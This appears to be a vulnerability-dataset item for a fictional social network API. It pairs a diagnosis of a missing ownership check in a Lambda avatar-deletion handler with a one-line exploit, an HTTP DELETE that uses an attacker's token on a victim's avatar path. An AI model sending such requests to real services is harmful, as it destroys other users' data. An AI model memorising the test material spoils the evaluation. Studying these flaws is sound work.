diagnosis: The Lambda handler deletes an avatar image from S3 based on the targetUserId provided in the path parameters without comparing targetUserId to the authenticated user's ID (event.requestContext.authorizer.claims.sub). Any user can delete other users' avatars.
exploit_request:
DELETE /users/usr_victim_99182/avatar HTTP/1.1
Host: api.socialnetwork.aws
Authorization: Bearer <attacker_jwt>
